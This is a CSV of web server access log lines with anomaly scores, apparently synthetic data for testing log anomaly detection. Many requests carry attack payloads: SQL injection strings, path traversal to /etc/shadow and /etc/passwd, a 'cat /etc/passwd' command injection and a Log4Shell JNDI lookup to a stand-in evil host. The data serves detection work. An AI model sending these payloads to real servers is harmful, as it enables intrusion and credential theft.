score_content,score_session,score_fused,score_fused_norm,line
13.453445434570312,,13.453445434570312,13.453445434570312,121.24.116.97 - - [10/Jan/2025:12:23:53 +0000] "PUT /profile HTTP/1.1" 200 18112 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.18765926361084,,2.18765926361084,2.18765926361084,99.30.47.199 - - [10/Jan/2025:12:23:54 +0000] "GET / HTTP/1.1" 200 6381 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.1635212898254395,,5.1635212898254395,5.1635212898254395,200.112.121.103 - - [10/Jan/2025:12:23:57 +0000] "GET / HTTP/1.1" 304 5733 "-" "nikto/2.5.0"
26.507383346557617,,26.507383346557617,26.507383346557617,91.57.234.16 - - [10/Jan/2025:12:23:59 +0000] "POST /api/product?id=123 HTTP/1.1" 200 13421 "https://example.com/" "python-requests/2.31.0"
23.57880973815918,,23.57880973815918,23.57880973815918,81.160.243.175 - - [10/Jan/2025:12:24:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 6886 "https://example.com/" "nikto/2.5.0"
30237.125,,30237.125,30237.125,112.204.84.61 - - [10/Jan/2025:12:24:04 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 404 550 "https://news.ycombinator.com/" "python-requests/2.31.0"
27.830564498901367,,27.830564498901367,27.830564498901367,137.158.218.238 - - [10/Jan/2025:12:24:05 +0000] "DELETE /admin HTTP/1.1" 200 16782 "https://example.com/" "nikto/2.5.0"
3.2430922985076904,,3.2430922985076904,3.2430922985076904,184.171.167.24 - - [10/Jan/2025:12:24:06 +0000] "GET /assets/app.js HTTP/1.1" 304 13408 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
38.06820297241211,,38.06820297241211,38.06820297241211,200.167.251.10 - - [10/Jan/2025:12:24:06 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 302 12471 "https://www.google.com/" "nikto/2.5.0"
72.38459777832031,,72.38459777832031,72.38459777832031,95.186.254.164 - - [10/Jan/2025:12:24:07 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 301 5521 "-" "python-requests/2.31.0"
0.3435346782207489,,0.3435346782207489,0.3435346782207489,209.98.207.237 - - [10/Jan/2025:12:24:10 +0000] "GET /index.html HTTP/1.1" 200 12731 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.699546813964844,,27.699546813964844,27.699546813964844,176.225.242.243 - - [10/Jan/2025:12:24:10 +0000] "DELETE /profile HTTP/1.1" 200 2918 "https://example.com/" "sqlmap/1.7.2#stable"
27.762269973754883,,27.762269973754883,27.762269973754883,78.184.99.7 - - [10/Jan/2025:12:24:13 +0000] "DELETE /contact HTTP/1.1" 200 17803 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
23.60325813293457,,23.60325813293457,23.60325813293457,7.152.189.152 - - [10/Jan/2025:12:24:14 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12595 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
3.28511905670166,,3.28511905670166,3.28511905670166,69.76.166.206 - - [10/Jan/2025:12:24:15 +0000] "GET /index.html HTTP/1.1" 304 4780 "-" "curl/7.85.0"
26.5579776763916,,26.5579776763916,26.5579776763916,79.226.98.16 - - [10/Jan/2025:12:24:15 +0000] "POST /search?q=ssd HTTP/1.1" 200 11266 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30137.830078125,,30137.830078125,30137.830078125,250.169.210.211 - - [10/Jan/2025:12:24:16 +0000] "DELETE /profile HTTP/1.1" 401 1458 "https://twitter.com/" "dirb/2.22"
30110.736328125,,30110.736328125,30110.736328125,79.108.221.230 - - [10/Jan/2025:12:24:17 +0000] "GET /assets/app.css HTTP/1.1" 401 1071 "https://news.ycombinator.com/" "python-requests/2.31.0"
30205.841796875,,30205.841796875,30205.841796875,31.135.13.20 - - [10/Jan/2025:12:24:20 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 403 238 "https://example.com/" "python-requests/2.31.0"
52.3840217590332,,52.3840217590332,52.3840217590332,150.53.56.183 - - [10/Jan/2025:12:24:21 +0000] "DELETE /api/user?id=1;DROP TABLE users HTTP/1.1" 304 2828 "-" "nikto/2.5.0"
30110.966796875,,30110.966796875,30110.966796875,90.165.211.26 - - [10/Jan/2025:12:24:23 +0000] "GET /index.html HTTP/1.1" 400 43 "https://news.ycombinator.com/" "python-requests/2.31.0"
104.90959930419922,,104.90959930419922,104.90959930419922,191.65.67.44 - - [10/Jan/2025:12:24:23 +0000] "TRACE /logout HTTP/1.1" 200 1975 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.462121963500977,,26.462121963500977,26.462121963500977,22.58.51.90 - - [10/Jan/2025:12:24:25 +0000] "POST /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 18118 "https://example.com/" "nikto/2.5.0"
30.619184494018555,,30.619184494018555,30.619184494018555,133.54.236.192 - - [10/Jan/2025:12:24:27 +0000] "DELETE /dashboard HTTP/1.1" 301 15789 "https://example.com/" "python-requests/2.31.0"
105.01699829101562,,105.01699829101562,105.01699829101562,186.35.87.194 - - [10/Jan/2025:12:24:30 +0000] "TRACE /about HTTP/1.1" 200 19305 "https://www.google.com/" "curl/7.85.0"
104.92977905273438,,104.92977905273438,104.92977905273438,126.243.220.164 - - [10/Jan/2025:12:24:32 +0000] "TRACE /contact HTTP/1.1" 200 14359 "https://twitter.com/" "nikto/2.5.0"
69.38885498046875,,69.38885498046875,69.38885498046875,189.249.39.184 - - [10/Jan/2025:12:24:32 +0000] "HEAD /search?q=camera HTTP/1.1" 200 1401 "https://www.google.com/" "curl/7.85.0"
35.11140823364258,,35.11140823364258,35.11140823364258,212.124.96.193 - - [10/Jan/2025:12:24:33 +0000] "PUT /search?q=router HTTP/1.1" 200 14588 "https://twitter.com/" "curl/7.85.0"
1.9415602684020996,,1.9415602684020996,1.9415602684020996,193.229.44.21 - - [10/Jan/2025:12:24:34 +0000] "GET /profile HTTP/1.1" 201 15320 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.624189376831055,,23.624189376831055,23.624189376831055,179.97.189.9 - - [10/Jan/2025:12:24:34 +0000] "GET /api/product?id=123 HTTP/1.1" 200 18815 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
104.74504089355469,,104.74504089355469,104.74504089355469,212.194.174.210 - - [10/Jan/2025:12:24:36 +0000] "TRACE /server-status HTTP/1.1" 200 11283 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.301307678222656,,49.301307678222656,49.301307678222656,202.220.220.235 - - [10/Jan/2025:12:24:38 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 1159 "-" "Wget/1.21.2 (linux-gnu)"
13.491888046264648,,13.491888046264648,13.491888046264648,39.137.23.158 - - [10/Jan/2025:12:24:38 +0000] "PUT /logout HTTP/1.1" 200 129 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
3.09183669090271,,3.09183669090271,3.09183669090271,108.58.215.252 - - [10/Jan/2025:12:24:40 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 200 10148 "https://www.google.com/" "curl/7.85.0"
35.046634674072266,,35.046634674072266,35.046634674072266,219.245.104.137 - - [10/Jan/2025:12:24:43 +0000] "PUT /search?q=monitor HTTP/1.1" 201 572 "-" "nikto/2.5.0"
126.61980438232422,,126.61980438232422,126.61980438232422,30.138.150.200 - - [10/Jan/2025:12:24:44 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 15509 "https://example.com/" "sqlmap/1.7.2#stable"
104.96831512451172,,104.96831512451172,104.96831512451172,224.132.222.130 - - [10/Jan/2025:12:24:44 +0000] "TRACE /logout HTTP/1.1" 200 15451 "-" "nikto/2.5.0"
35.12746810913086,,35.12746810913086,35.12746810913086,25.194.2.117 - - [10/Jan/2025:12:24:46 +0000] "PUT /search?q=ssd HTTP/1.1" 200 2511 "https://twitter.com/" "nikto/2.5.0"
30115.26171875,,30115.26171875,30115.26171875,229.206.14.229 - - [10/Jan/2025:12:24:46 +0000] "POST /login HTTP/1.1" 404 128 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.18921691179275513,,0.18921691179275513,0.18921691179275513,134.125.171.7 - - [10/Jan/2025:12:24:48 +0000] "GET /assets/app.css HTTP/1.1" 201 1619 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.1936808079481125,,0.1936808079481125,0.1936808079481125,25.45.175.84 - - [10/Jan/2025:12:24:50 +0000] "GET /assets/app.css HTTP/1.1" 200 2639 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.79110336303711,,47.79110336303711,47.79110336303711,141.68.49.184 - - [10/Jan/2025:12:24:51 +0000] "HEAD /about HTTP/1.1" 201 3341 "-" "python-requests/2.31.0"
0.26955899596214294,,0.26955899596214294,0.26955899596214294,228.170.109.75 - - [10/Jan/2025:12:24:54 +0000] "GET /assets/app.js HTTP/1.1" 200 14425 "https://news.ycombinator.com/" "curl/7.85.0"
69.43193817138672,,69.43193817138672,69.43193817138672,218.237.205.225 - - [10/Jan/2025:12:24:57 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 11229 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.2085089683532715,,3.2085089683532715,3.2085089683532715,190.168.60.60 - - [10/Jan/2025:12:24:59 +0000] "GET /assets/app.js HTTP/1.1" 302 15087 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
95.14836120605469,,95.14836120605469,95.14836120605469,199.163.213.51 - - [10/Jan/2025:12:25:01 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 7873 "https://twitter.com/" "dirb/2.22"
13.345209121704102,,13.345209121704102,13.345209121704102,186.91.80.78 - - [10/Jan/2025:12:25:02 +0000] "PUT /api/products HTTP/1.1" 200 10782 "-" "python-requests/2.31.0"
26.454526901245117,,26.454526901245117,26.454526901245117,122.117.176.243 - - [10/Jan/2025:12:25:04 +0000] "POST /search?q=router HTTP/1.1" 200 4029 "https://example.com/" "dirb/2.22"
69.33932495117188,,69.33932495117188,69.33932495117188,139.151.89.112 - - [10/Jan/2025:12:25:04 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 5899 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.752262115478516,,47.752262115478516,47.752262115478516,70.134.110.188 - - [10/Jan/2025:12:25:07 +0000] "HEAD /logout HTTP/1.1" 200 2474 "https://example.com/" "python-requests/2.31.0"
35.012325286865234,,35.012325286865234,35.012325286865234,34.97.15.219 - - [10/Jan/2025:12:25:09 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 789 "https://twitter.com/" "dirb/2.22"
26.499879837036133,,26.499879837036133,26.499879837036133,121.238.116.195 - - [10/Jan/2025:12:25:11 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 6073 "https://www.google.com/" "curl/7.85.0"
26.482471466064453,,26.482471466064453,26.482471466064453,149.212.222.225 - - [10/Jan/2025:12:25:14 +0000] "POST /search?q=router HTTP/1.1" 200 9867 "https://news.ycombinator.com/" "dirb/2.22"
30123.673828125,,30123.673828125,30123.673828125,33.212.168.82 - - [10/Jan/2025:12:25:17 +0000] "PUT /contact HTTP/1.1" 404 1238 "https://example.com/" "sqlmap/1.7.2#stable"
0.2320784628391266,,0.2320784628391266,0.2320784628391266,34.124.43.129 - - [10/Jan/2025:12:25:18 +0000] "GET /assets/app.css HTTP/1.1" 200 10689 "https://twitter.com/" "nikto/2.5.0"
27.83197593688965,,27.83197593688965,27.83197593688965,164.50.136.200 - - [10/Jan/2025:12:25:19 +0000] "DELETE /about HTTP/1.1" 200 17221 "https://twitter.com/" "nikto/2.5.0"
2.2005248069763184,,2.2005248069763184,2.2005248069763184,102.124.194.122 - - [10/Jan/2025:12:25:21 +0000] "GET / HTTP/1.1" 200 9117 "https://news.ycombinator.com/" "nikto/2.5.0"
34.99695587158203,,34.99695587158203,34.99695587158203,83.130.144.92 - - [10/Jan/2025:12:25:23 +0000] "PUT /search?q=headphones HTTP/1.1" 200 4252 "https://www.google.com/" "sqlmap/1.7.2#stable"
27.671159744262695,,27.671159744262695,27.671159744262695,14.40.51.164 - - [10/Jan/2025:12:25:26 +0000] "DELETE /api/products HTTP/1.1" 200 15068 "https://www.google.com/" "curl/7.85.0"
73.47927856445312,,73.47927856445312,73.47927856445312,98.141.161.38 - - [10/Jan/2025:12:25:28 +0000] "OPTIONS /logout HTTP/1.1" 200 2783 "https://example.com/" "dirb/2.22"
0.19183661043643951,,0.19183661043643951,0.19183661043643951,199.194.109.209 - - [10/Jan/2025:12:25:31 +0000] "GET /assets/app.css HTTP/1.1" 200 1238 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
107.79147338867188,,107.79147338867188,107.79147338867188,2.186.95.80 - - [10/Jan/2025:12:25:34 +0000] "TRACE /api/products HTTP/1.1" 304 924 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24995474517345428,,0.24995474517345428,0.24995474517345428,108.15.224.21 - - [10/Jan/2025:12:25:34 +0000] "GET /assets/app.css HTTP/1.1" 200 15511 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
7.864741325378418,,7.864741325378418,7.864741325378418,204.81.104.183 - - [10/Jan/2025:12:25:37 +0000] "POST /login HTTP/1.1" 302 18059 "https://www.google.com/" "python-requests/2.31.0"
30214.955078125,,30214.955078125,30214.955078125,191.135.175.57 - - [10/Jan/2025:12:25:38 +0000] "TRACE /about HTTP/1.1" 401 1385 "https://news.ycombinator.com/" "curl/7.85.0"
0.19787926971912384,,0.19787926971912384,0.19787926971912384,195.189.81.33 - - [10/Jan/2025:12:25:40 +0000] "GET /assets/app.css HTTP/1.1" 200 3521 "https://news.ycombinator.com/" "python-requests/2.31.0"
95.1610336303711,,95.1610336303711,95.1610336303711,101.166.118.11 - - [10/Jan/2025:12:25:42 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 10792 "https://example.com/" "sqlmap/1.7.2#stable"
2.2233872413635254,,2.2233872413635254,2.2233872413635254,65.28.24.247 - - [10/Jan/2025:12:25:45 +0000] "GET / HTTP/1.1" 200 14996 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
49.570457458496094,,49.570457458496094,49.570457458496094,100.143.248.198 - - [10/Jan/2025:12:25:48 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16422 "-" "python-requests/2.31.0"
49.4364128112793,,49.4364128112793,49.4364128112793,212.61.43.98 - - [10/Jan/2025:12:25:48 +0000] "DELETE /search?q=camera HTTP/1.1" 200 18193 "https://twitter.com/" "dirb/2.22"
2.1964449882507324,,2.1964449882507324,2.1964449882507324,164.200.93.251 - - [10/Jan/2025:12:25:49 +0000] "GET / HTTP/1.1" 200 8211 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30134.451171875,,30134.451171875,30134.451171875,238.92.241.32 - - [10/Jan/2025:12:25:49 +0000] "GET /search?q=headphones HTTP/1.1" 401 24 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30110.861328125,,30110.861328125,30110.861328125,82.162.90.239 - - [10/Jan/2025:12:25:49 +0000] "GET /assets/app.css HTTP/1.1" 404 1353 "https://twitter.com/" "curl/7.85.0"
35.15932083129883,,35.15932083129883,35.15932083129883,193.150.205.173 - - [10/Jan/2025:12:25:50 +0000] "PUT /search?q=ssd HTTP/1.1" 204 10406 "https://www.google.com/" "nikto/2.5.0"
4.9097089767456055,,4.9097089767456055,4.9097089767456055,43.17.91.203 - - [10/Jan/2025:12:25:50 +0000] "POST /about HTTP/1.1" 204 165 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.63759994506836,,47.63759994506836,47.63759994506836,58.27.22.189 - - [10/Jan/2025:12:25:51 +0000] "HEAD /api/products HTTP/1.1" 200 2877 "-" "dirb/2.22"
95.23356628417969,,95.23356628417969,95.23356628417969,17.81.232.35 - - [10/Jan/2025:12:25:53 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 11687 "https://news.ycombinator.com/" "python-requests/2.31.0"
69.53145599365234,,69.53145599365234,69.53145599365234,110.144.243.18 - - [10/Jan/2025:12:25:56 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 1190 "https://twitter.com/" "curl/7.85.0"
35.19350814819336,,35.19350814819336,35.19350814819336,109.77.224.93 - - [10/Jan/2025:12:25:58 +0000] "PUT /search?q=ssd HTTP/1.1" 200 18393 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
1.9459068775177002,,1.9459068775177002,1.9459068775177002,203.234.198.117 - - [10/Jan/2025:12:26:01 +0000] "GET /logout HTTP/1.1" 200 7277 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.7161399126052856,,1.7161399126052856,1.7161399126052856,33.190.126.246 - - [10/Jan/2025:12:26:01 +0000] "GET /server-status HTTP/1.1" 201 3895 "https://news.ycombinator.com/" "curl/7.85.0"
2.1800811290740967,,2.1800811290740967,2.1800811290740967,119.1.141.154 - - [10/Jan/2025:12:26:04 +0000] "GET / HTTP/1.1" 204 5986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.52523803710938,,73.52523803710938,73.52523803710938,121.188.195.208 - - [10/Jan/2025:12:26:04 +0000] "OPTIONS /login HTTP/1.1" 200 4634 "https://example.com/" "sqlmap/1.7.2#stable"
26.5230712890625,,26.5230712890625,26.5230712890625,35.141.215.84 - - [10/Jan/2025:12:26:06 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 11260 "https://news.ycombinator.com/" "dirb/2.22"
0.21317511796951294,,0.21317511796951294,0.21317511796951294,41.185.78.57 - - [10/Jan/2025:12:26:08 +0000] "GET /assets/app.css HTTP/1.1" 200 6491 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.237483501434326,,2.237483501434326,2.237483501434326,104.129.201.250 - - [10/Jan/2025:12:26:11 +0000] "GET / HTTP/1.1" 200 19403 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
47.80766296386719,,47.80766296386719,47.80766296386719,145.169.188.3 - - [10/Jan/2025:12:26:14 +0000] "HEAD /logout HTTP/1.1" 200 14961 "-" "curl/7.85.0"
13.375937461853027,,13.375937461853027,13.375937461853027,104.51.124.162 - - [10/Jan/2025:12:26:16 +0000] "PUT /dashboard HTTP/1.1" 204 15883 "-" "Wget/1.21.2 (linux-gnu)"
30123.55078125,,30123.55078125,30123.55078125,223.213.190.205 - - [10/Jan/2025:12:26:17 +0000] "PUT /api/products HTTP/1.1" 403 1348 "https://www.google.com/" "dirb/2.22"
0.3375367224216461,,0.3375367224216461,0.3375367224216461,66.80.113.113 - - [10/Jan/2025:12:26:19 +0000] "GET /.git/config HTTP/1.1" 200 19473 "https://example.com/" "python-requests/2.31.0"
126.44583129882812,,126.44583129882812,126.44583129882812,74.214.178.24 - - [10/Jan/2025:12:26:20 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 1625 "https://example.com/" "python-requests/2.31.0"
1.9092940092086792,,1.9092940092086792,1.9092940092086792,167.94.244.7 - - [10/Jan/2025:12:26:23 +0000] "GET /contact HTTP/1.1" 200 6975 "https://news.ycombinator.com/" "python-requests/2.31.0"
126.63867950439453,,126.63867950439453,126.63867950439453,195.41.7.215 - - [10/Jan/2025:12:26:24 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 17677 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.769279956817627,,1.769279956817627,1.769279956817627,16.173.105.246 - - [10/Jan/2025:12:26:27 +0000] "GET /server-status HTTP/1.1" 200 15780 "https://news.ycombinator.com/" "python-requests/2.31.0"
37.99062728881836,,37.99062728881836,37.99062728881836,187.188.198.82 - - [10/Jan/2025:12:26:28 +0000] "PUT /search?q=monitor HTTP/1.1" 301 6472 "https://news.ycombinator.com/" "python-requests/2.31.0"
69.41360473632812,,69.41360473632812,69.41360473632812,219.56.160.183 - - [10/Jan/2025:12:26:28 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2853 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.858242511749268,,4.858242511749268,4.858242511749268,227.85.119.90 - - [10/Jan/2025:12:26:31 +0000] "POST /profile HTTP/1.1" 200 19641 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.07843780517578,,95.07843780517578,95.07843780517578,68.67.48.199 - - [10/Jan/2025:12:26:32 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 7553 "-" "sqlmap/1.7.2#stable"
69.35192108154297,,69.35192108154297,69.35192108154297,22.218.58.134 - - [10/Jan/2025:12:26:33 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 8527 "https://example.com/" "curl/7.85.0"
29.41822624206543,,29.41822624206543,29.41822624206543,116.105.182.224 - - [10/Jan/2025:12:26:34 +0000] "POST /search?q=phone HTTP/1.1" 302 3149 "https://twitter.com/" "sqlmap/1.7.2#stable"
69.44274139404297,,69.44274139404297,69.44274139404297,205.248.111.120 - - [10/Jan/2025:12:26:34 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 14099 "-" "sqlmap/1.7.2#stable"
35.163108825683594,,35.163108825683594,35.163108825683594,33.170.142.92 - - [10/Jan/2025:12:26:35 +0000] "PUT /search?q=ssd HTTP/1.1" 200 9900 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
30157.88671875,,30157.88671875,30157.88671875,176.60.43.181 - - [10/Jan/2025:12:26:35 +0000] "HEAD /contact HTTP/1.1" 401 187 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.15852355957031,,95.15852355957031,95.15852355957031,179.180.116.67 - - [10/Jan/2025:12:26:35 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 10183 "-" "curl/7.85.0"
35.01170349121094,,35.01170349121094,35.01170349121094,66.113.8.75 - - [10/Jan/2025:12:26:36 +0000] "PUT /search?q=headphones HTTP/1.1" 200 7158 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
4.873544692993164,,4.873544692993164,4.873544692993164,24.139.140.86 - - [10/Jan/2025:12:26:39 +0000] "POST /logout HTTP/1.1" 200 13660 "-" "sqlmap/1.7.2#stable"
35.06888198852539,,35.06888198852539,35.06888198852539,252.235.137.102 - - [10/Jan/2025:12:26:42 +0000] "PUT /search?q=monitor HTTP/1.1" 200 8822 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
6.085664749145508,,6.085664749145508,6.085664749145508,177.134.219.162 - - [10/Jan/2025:12:26:44 +0000] "POST /../../etc/passwd HTTP/1.1" 304 13975 "https://twitter.com/" "nikto/2.5.0"
30205.658203125,,30205.658203125,30205.658203125,176.24.164.184 - - [10/Jan/2025:12:26:45 +0000] "OPTIONS /search?q=router HTTP/1.1" 401 777 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
104.79407501220703,,104.79407501220703,104.79407501220703,201.252.53.188 - - [10/Jan/2025:12:26:48 +0000] "TRACE /api/products HTTP/1.1" 200 2265 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
107.84126281738281,,107.84126281738281,107.84126281738281,21.69.251.48 - - [10/Jan/2025:12:26:50 +0000] "TRACE /contact HTTP/1.1" 301 8422 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.44263458251953,,73.44263458251953,73.44263458251953,136.8.195.188 - - [10/Jan/2025:12:26:53 +0000] "OPTIONS /dashboard HTTP/1.1" 200 17575 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
126.54443359375,,126.54443359375,126.54443359375,38.199.246.46 - - [10/Jan/2025:12:26:55 +0000] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7922 "https://twitter.com/" "curl/7.85.0"
3.144101619720459,,3.144101619720459,3.144101619720459,32.60.20.22 - - [10/Jan/2025:12:26:55 +0000] "GET /assets/app.css HTTP/1.1" 302 5366 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
73.44388580322266,,73.44388580322266,73.44388580322266,64.67.111.100 - - [10/Jan/2025:12:26:56 +0000] "OPTIONS /contact HTTP/1.1" 200 2654 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.38925170898438,,73.38925170898438,73.38925170898438,38.152.19.14 - - [10/Jan/2025:12:26:56 +0000] "OPTIONS /dashboard HTTP/1.1" 200 4613 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.2239561080932617,,3.2239561080932617,3.2239561080932617,165.91.159.52 - - [10/Jan/2025:12:26:56 +0000] "POST /.git/config HTTP/1.1" 200 14213 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.2432844638824463,,0.2432844638824463,0.2432844638824463,235.23.44.111 - - [10/Jan/2025:12:26:58 +0000] "GET /wp-login.php HTTP/1.1" 200 2918 "https://www.google.com/" "sqlmap/1.7.2#stable"
73.58016967773438,,73.58016967773438,73.58016967773438,215.230.229.174 - - [10/Jan/2025:12:27:01 +0000] "OPTIONS /login HTTP/1.1" 200 18105 "https://news.ycombinator.com/" "curl/7.85.0"
69.40069580078125,,69.40069580078125,69.40069580078125,99.39.75.6 - - [10/Jan/2025:12:27:02 +0000] "HEAD /search?q=camera HTTP/1.1" 200 4516 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
46.002506256103516,,46.002506256103516,46.002506256103516,7.147.19.88 - - [10/Jan/2025:12:27:02 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 3847 "-" "nikto/2.5.0"
